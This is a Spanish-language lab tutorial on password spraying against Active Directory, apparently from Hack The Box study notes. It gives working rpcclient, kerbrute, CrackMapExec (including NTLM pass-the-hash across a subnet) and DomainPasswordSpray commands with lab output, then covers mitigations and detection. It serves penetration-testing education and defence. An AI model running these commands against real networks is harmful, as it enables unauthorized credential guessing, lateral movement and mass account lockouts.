Ahora que hemos creado una lista de contraseñas utilizando alguno de los métodos descritos anteriormente, es momento de ejecutar el ataque. En las próximas secciones practicaremos **Password Spraying** desde sistemas Linux y Windows. Este tipo de ataque es uno de los dos métodos principales para obtener credenciales de dominio, pero debemos llevarlo a cabo con **precaución**, ya que un mal uso puede provocar bloqueos de cuentas o generar alertas en la red.
### Desde Linux

Una vez que hemos generado una lista de contraseñas con alguno de los métodos mostrados en la sección anterior, llega el momento de lanzar el ataque. **`rpcclient`** es una opción muy útil para realizarlo desde un sistema Linux.

Un punto importante a tener en cuenta es que **`rpcclient` no muestra de forma explícita si el inicio de sesión ha sido exitoso**. Sin embargo, si la respuesta contiene `"Authority Name"`, significa que las credenciales han sido válidas.

Por ello, podemos **filtrar los intentos fallidos** buscando únicamente las respuestas que incluyan `"Authority"`. Para ello, se puede utilizar un **one-liner en Bash** que automatiza el ataque e identifica intentos exitosos mediante ese patrón.

##### Usando un one-liner para el ataque

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

##### Usando Kerbrute

También podemos usar `kerbrute` para realizar el mismo ataque:

```shell-session
amr251@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Existen varios métodos para realizar ataques de password spraying desde Linux, y otra excelente opción es utilizar **CrackMapExec**. Esta herramienta versátil permite usar un archivo de texto con múltiples nombres de usuario y probarlos todos contra una única contraseña, característica clave para un ataque de spraying.

En este contexto, se puede utilizar `grep` para filtrar las respuestas que contienen el símbolo `+`, que indica inicios de sesión exitosos. Esto ayuda a centrarse únicamente en los intentos válidos, evitando que se pierda información útil entre las muchas líneas de salida que genera el comando.

##### Usando CrackMapExec y filtrando errores de login

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Una vez que obtenemos uno o más accesos exitosos mediante un ataque de password spraying, podemos usar **CrackMapExec** para validar rápidamente las credenciales contra un **Controlador de Dominio**. Esto permite confirmar que el nombre de usuario y la contraseña funcionan correctamente y, además, verificar el nivel de acceso que tienen dentro del dominio.

##### Validando las credenciales con CrackMapExec

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

##### Reutilización de la contraseña del administrador local

El password spraying interno no se limita a cuentas de dominio. Si se obtiene acceso administrativo y el hash NTLM o la contraseña en claro de una cuenta local con privilegios (como _Administrator_), se puede intentar autenticar contra múltiples equipos de la red. Esto es común debido al uso de imágenes base (gold images) donde la contraseña local se reutiliza.

**CrackMapExec** es ideal para este tipo de ataques. Es especialmente útil apuntar a máquinas críticas como servidores SQL o Exchange, ya que es más probable que allí haya credenciales privilegiadas en memoria.

Es buena práctica probar variaciones de contraseñas si encontramos un patrón (por ejemplo, `$desktop%@admin123` → `$server%@admin123`). También conviene probar si un usuario reutiliza la misma contraseña en su cuenta administrativa (ej. `ajones` y `ajones_adm`), o incluso entre dominios si hay relaciones de confianza.

Si solo tenemos el hash NTLM, podemos hacer un spray contra todo un rango (por ejemplo, una /23) usando la opción `--local-auth` en CrackMapExec. Esta bandera fuerza la autenticación local y evita bloqueos accidentales en el dominio. Sin ella, el intento sería contra el dominio y podría bloquear cuentas.

##### Local Admin Spraying con CrackMapExec

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

Este método nos muestra que las credenciales son válidas como administrador local en tres sistemas dentro del rango 172.16.5.0/23. A partir de aquí, podríamos enumerar esos sistemas en busca de información útil para escalar privilegios o moverse lateralmente.

Sin embargo, esta técnica es bastante ruidosa y no es adecuada para escenarios donde se requiere sigilo. Aun así, merece la pena comprobar si existe este problema en las auditorías, ya que es una debilidad común que debe comunicarse al cliente.

Una forma de mitigarlo es implementar **Microsoft LAPS (Local Administrator Password Solution)**, que permite a Active Directory gestionar contraseñas únicas y rotatorias para las cuentas de administrador local en cada máquina.
### Desde Windows

Desde un punto de apoyo en un equipo Windows unido al dominio, la herramienta [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) resulta muy efectiva. Si ya estamos autenticados en el dominio, la herramienta generará automáticamente una lista de usuarios desde Active Directory, consultará la política de contraseñas del dominio y excluirá las cuentas de usuario que estén a un intento de bloqueo. Al igual que ejecutamos el ataque de “spray” desde nuestro equipo Linux, también podemos proporcionar manualmente una lista de usuarios a la herramienta si estamos en un equipo Windows pero **no** autenticados en el dominio.

DomainPasswordSpray en un Windows unido al dominio genera sola la lista de usuarios de AD, aplica la política de contraseñas y evita bloquear cuentas cercanas al límite; solo hay que pasarle una contraseña con `-Password` y guardar los resultados con `-OutFile`.

##### Usando DomainPasswordSpray.ps1

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

También podríamos utilizar `kerbrute` para acontecer la misma enumeración de usuarios y pasos de spraying mostrados en la sección anterior. 

##### Mitigaciones

Se pueden aplicar varias medidas para mitigar el riesgo de ataques de password spraying. Aunque ninguna solución por sí sola lo evita por completo, un enfoque de defensa en profundidad hará que estos ataques sean extremadamente difíciles.

| Técnica                         | Descripción                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Autenticación multifactor       | La autenticación multifactor reduce drásticamente el riesgo de password spraying. Hay varios tipos: notificaciones push a un dispositivo móvil, contraseñas de un solo uso (OTP) rotativas como Google Authenticator, clave RSA o confirmaciones por SMS. Aunque esto impida al atacante acceder, algunas implementaciones aún revelan si la combinación usuario/contraseña es válida, posibilitando reutilizarla en otros servicios. Es crucial aplicarlo en todos los portales externos. |
| Restricción de acceso           | A menudo cualquier cuenta de dominio puede iniciar sesión en aplicaciones, incluso si no la necesita para su rol. Siguiendo el principio de privilegio mínimo, el acceso debe limitarse solo a quienes realmente lo requieran.                                                                                                                                                                                                                                                                               |
| Reducción del impacto           | Un atajo eficaz es que los usuarios privilegiados usen una cuenta separada para actividades administrativas. También conviene implementar niveles de permiso específicos por aplicación. La segmentación de red es recomendable, pues aislar al atacante en una subred comprometida puede ralentizar o detener el movimiento lateral y nuevas intrusiones.                                                                                                      |
| Higiene de contraseñas          | Formar a los usuarios para elegir contraseñas difíciles de adivinar, como frases de paso, disminuye la eficacia del password spraying. Además, usar filtros que bloqueen palabras comunes, meses, estaciones o variaciones del nombre de la empresa complica al atacante elegir contraseñas válidas para sus intentos.                                                                                                                                                |

Es vital garantizar que la política de bloqueo de contraseñas del dominio no incremente el riesgo de ataques de denegación de servicio. Si resulta demasiado restrictiva y exige intervención administrativa para desbloquear cuentas manualmente, un password spray descuidado podría bloquear numerosas cuentas en poco tiempo.

##### Detección

Los signos más claros de un ataque de password spraying externo son un aumento repentino de bloqueos de cuentas y un volumen elevado de intentos de inicio de sesión en poco tiempo, ya sea contra usuarios válidos o inexistentes. En los controladores de dominio, múltiples eventos 4625 (fallo de inicio de sesión) en cortos intervalos deberían generar alertas; un atacante sofisticado puede evitar SMB y atacar LDAP, lo que se refleja en eventos 4771 (fallo de preautenticación Kerberos) si se habilita el registro Kerberos. Configurar reglas que correlacionen esos fallos y mantener un registro exhaustivo permite detectar y frenar tanto ataques externos como internos de password spraying.

##### Password Spraying externo

Aunque está fuera del alcance de este módulo, el password spraying también es una técnica habitual que los atacantes emplean para intentar obtener un punto de apoyo en Internet. Hemos tenido mucho éxito con este método durante pruebas de penetración para acceder a datos sensibles a través de buzones de correo o aplicaciones web como intranets accesibles externamente. Algunos objetivos comunes incluyen:

- Microsoft 0365    
- Outlook Web Exchange    
- Exchange Web Access    
- Skype for Business    
- Lync Server    
- Portales de Microsoft Remote Desktop Services (RDS)    
- Portales Citrix que usan autenticación de AD    
- Implementaciones VDI con autenticación de AD, como VMware Horizon    
- Portales VPN (Citrix, SonicWall, OpenVPN, Fortinet, etc. que usan autenticación de AD)    
- Aplicaciones web personalizadas que usan autenticación de AD